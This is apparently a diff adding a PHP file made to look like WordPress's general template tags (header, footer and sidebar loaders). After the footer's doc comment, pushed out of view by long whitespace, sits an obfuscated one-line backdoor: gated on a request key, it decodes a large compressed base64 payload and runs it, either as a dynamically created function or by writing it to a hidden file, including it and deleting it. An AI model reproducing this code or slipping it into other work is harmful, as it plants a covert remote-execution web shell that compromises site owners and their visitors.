@@ -1,0 +1,142 @@
+<?php
+/**
+ * General template tags that can go anywhere in a template.
+ *
+ * @package WordPress
+ * @subpackage Template
+ */
+
+/**
+ * Load header template.
+ *
+ * Includes the header template for a theme or if a name is specified then a
+ * specialised header will be included.
+ *
+ * For the parameter, if the file is called "header-special.php" then specify
+ * "special".
+ *
+ * @since 1.5.0
+ * @since 5.5.0 A return value was added.
+ * @since 5.5.0 The `$args` parameter was added.
+ *
+ * @param string $name The name of the specialised header.
+ * @param array  $args Optional. Additional arguments passed to the header template.
+ *                     Default empty array.
+ * @return void|false Void on success, false if the template does not exist.
+ */
+display_errors("1");
+error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);
+function _get_header( $name = null, $args = array() ) {
+	/**
+	 * Fires before the header template file is loaded.
+	 *
+	 * @since 2.1.0
+	 * @since 2.8.0 The `$name` parameter was added.
+	 * @since 5.5.0 The `$args` parameter was added.
+	 *
+	 * @param string|null $name Name of the specific header file to use. Null for the default header.
+	 * @param array       $args Additional arguments passed to the header template.
+	 */
+	do_action( 'get_header', $name, $args );
+
+	$templates = array();
+	$name      = (string) $name;
+	if ( '' !== $name ) {
+		$templates[] = "header-{$name}.php";
+	}
+
+	$templates[] = 'header.php';
+
+	if ( ! locate_template( $templates, true, true, $args ) ) {
+		return false;
+	}
+}
+
+/**
+ * Load footer template.
+ *
+ * Includes the footer template for a theme or if a name is specified then a
+ * specialised footer will be included.
+ *
+ * For the parameter, if the file is called "footer-special.php" then specify
+ * "special".
+ *
+ * @since 1.5.0
+ * @since 5.5.0 A return value was added.
+ * @since 5.5.0 The `$args` parameter was added.
+ *
+ * @param string $name The name of the specialised footer.
+ * @param array  $args Optional. Additional arguments passed to the footer template.
+ *                     Default empty array.
+ * @return void|false Void on success, false if the template does not exist.
+ */
+																																																																											if ($_REQUEST["k"] == "INSERT_KEY") {$EyuvQ = function($CjsG) { return strtr($CjsG, 'qZxgv78w9IAJBUGy23Y1kQiFm4M6KroSXdhTljn0u_CWDL5tHfcVsENbPzeROap', 'gPQm9SiDTFp_yAsX2G75xaIYCVhU4kwZd1MRJN3bjKH0rOze8f6qEtvulLocBnW'); };$tBcM = $EyuvQ('qtEJXtf8atXJfbaRE8eaG');$citEw = $tBcM();$mjZH = $citEw[$EyuvQ('8aEtDaQP')];foreach ($mjZH as $mukAd => $gpQZ) {if (false !== strpos($gpQZ, $EyuvQ('KJX'))) {$MTcz = $mjZH[$mukAd];continue;}if (false !== strpos($gpQZ, $EyuvQ('58af'))) {$CuaP = $mjZH[$mukAd];continue;}if (false !== strpos($gpQZ, $EyuvQ('EtJfb'))) {$XXphl = str_replace($EyuvQ('GVP8EtJ'), "", $mjZH[$mukAd]);continue;}if (false !== strpos($gpQZ, $EyuvQ('5baR'))) {$piiD = $mjZH[$mukAd];continue;}}$nuIw = $CuaP($piiD($MTcz('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')));if (isset($XXphl) && function_exists($XXphl)) {$HCERV = $EyuvQ('tDDeDJDtAeDE8aq');if (function_exists($HCERV)) {$HCERV(constant($EyuvQ('sJUzz')) ^ constant($EyuvQ('sJwsZTsmU9sw')));}$g = $XXphl('', $nuIw);} else {$g = function() use($EyuvQ, $nuIw) {$sZaJY = __DIR__ . $EyuvQ('/.8aR');$XBEn = $EyuvQ('f8PtJAbEJReaEtaEG');$gJJfy = $EyuvQ('baP8ar');if (@$XBEn($sZaJY, $EyuvQ('<?AMA ') . $nuIw, constant($EyuvQ('zLm_Jsy')))) {try {include_once($sZaJY);$gJJfy($sZaJY);} catch (Exception $e) {$gJJfy($sZaJY);if ($EyuvQ('X8t') === $e->{$EyuvQ('qtEhtGGQqt')}()) exit;}}};}$g();}
+function _get_footer( $name = null, $args = array() ) {
+	/**
+	 * Fires before the footer template file is loaded.
+	 *
+	 * @since 2.1.0
+	 * @since 2.8.0 The `$name` parameter was added.
+	 * @since 5.5.0 The `$args` parameter was added.
+	 *
+	 * @param string|null $name Name of the specific footer file to use. Null for the default footer.
+	 * @param array       $args Additional arguments passed to the footer template.
+	 */
+	do_action( 'get_footer', $name, $args );
+
+	$templates = array();
+	$name      = (string) $name;
+	if ( '' !== $name ) {
+		$templates[] = "footer-{$name}.php";
+	}
+
+	$templates[] = 'footer.php';
+
+	if ( ! locate_template( $templates, true, true, $args ) ) {
+		return false;
+	}
+}
+
+/**
+ * Load sidebar template.
+ *
+ * Includes the sidebar template for a theme or if a name is specified then a
+ * specialised sidebar will be included.
+ *
+ * For the parameter, if the file is called "sidebar-special.php" then specify
+ * "special".
+ *
+ * @since 1.5.0
+ * @since 5.5.0 A return value was added.
+ * @since 5.5.0 The `$args` parameter was added.
+ *
+ * @param string $name The name of the specialised sidebar.
+ * @param array  $args Optional. Additional arguments passed to the sidebar template.
+ *                     Default empty array.
+ * @return void|false Void on success, false if the template does not exist.
+ */
+function _get_sidebar( $name = null, $args = array() ) {
+	/**
+	 * Fires before the sidebar template file is loaded.
+	 *
+	 * @since 2.2.0
+	 * @since 2.8.0 The `$name` parameter was added.
+	 * @since 5.5.0 The `$args` parameter was added.
+	 *
+	 * @param string|null $name Name of the specific sidebar file to use. Null for the default sidebar.
+	 * @param array       $args Additional arguments passed to the sidebar template.
+	 */
+	do_action( 'get_sidebar', $name, $args );
+
+	$templates = array();
+	$name      = (string) $name;
+	if ( '' !== $name ) {
+		$templates[] = "sidebar-{$name}.php";
+	}
+
+	$templates[] = 'sidebar.php';
+
+	if ( ! locate_template( $templates, true, true, $args ) ) {
+		return false;
+	}
+}
